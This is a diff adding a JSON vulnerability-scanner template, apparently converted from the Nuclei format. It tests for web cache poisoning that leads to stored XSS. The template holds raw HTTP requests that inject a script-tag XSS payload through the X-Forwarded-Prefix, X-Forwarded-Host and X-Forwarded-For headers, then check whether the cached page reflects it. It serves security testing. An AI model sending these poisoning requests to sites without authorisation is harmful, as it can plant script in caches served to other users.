@@ -1,0 +1,136 @@
+{
+  "id": "cache-poisoning-xss",
+  "name": "Cache Poisoning - Stored XSS",
+  "author": "melbadry9,xelkomy,akincibor",
+  "severity": "HIGH",
+  "description": "Cache Poisoning leads to Stored XSS.",
+  "references": [
+    "https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning",
+    "https://portswigger.net/research/practical-web-cache-poisoning",
+    "https://portswigger.net/web-security/web-cache-poisoning"
+  ],
+  "tags": [
+    "cache",
+    "generic",
+    "xss"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {
+    "cache_header": [
+      "{{to_lower(rand_base(6))}}"
+    ],
+    "cache_key": [
+      "{{to_lower(rand_base(6))}}"
+    ],
+    "xss_payload": [
+      "\"\u003e\u003c/script\u003e\u003cscript\u003ealert(document.domain);\u003c/script\u003e"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /?{{cache_key}}\u003d1 HTTP/1.1\nHost: {{Hostname}}\nX-Forwarded-Prefix: {{cache_header}}.xfp{{xss_payload}}\nX-Forwarded-Host: {{cache_header}}.xfh{{xss_payload}}\nX-Forwarded-For: {{cache_header}}.xff{{xss_payload}}\n",
+        "GET /?{{cache_key}}\u003d1 HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(body_2, cache_header)",
+            "contains(body_2, xss_payload)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "cache-poisoning-xss",
+    "info": {
+      "name": "Cache Poisoning - Stored XSS",
+      "author": "melbadry9,xelkomy,akincibor",
+      "severity": "high",
+      "description": "Cache Poisoning leads to Stored XSS.",
+      "reference": [
+        "https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning",
+        "https://portswigger.net/research/practical-web-cache-poisoning",
+        "https://portswigger.net/web-security/web-cache-poisoning"
+      ],
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "cache,generic,xss"
+    },
+    "variables": {
+      "cache_key": "{{to_lower(rand_base(6))}}",
+      "cache_header": "{{to_lower(rand_base(6))}}",
+      "xss_payload": "\"\u003e\u003c/script\u003e\u003cscript\u003ealert(document.domain);\u003c/script\u003e"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /?{{cache_key}}\u003d1 HTTP/1.1\nHost: {{Hostname}}\nX-Forwarded-Prefix: {{cache_header}}.xfp{{xss_payload}}\nX-Forwarded-Host: {{cache_header}}.xfh{{xss_payload}}\nX-Forwarded-For: {{cache_header}}.xff{{xss_payload}}\n",
+          "GET /?{{cache_key}}\u003d1 HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(body_2, cache_header)",
+              "contains(body_2, xss_payload)"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
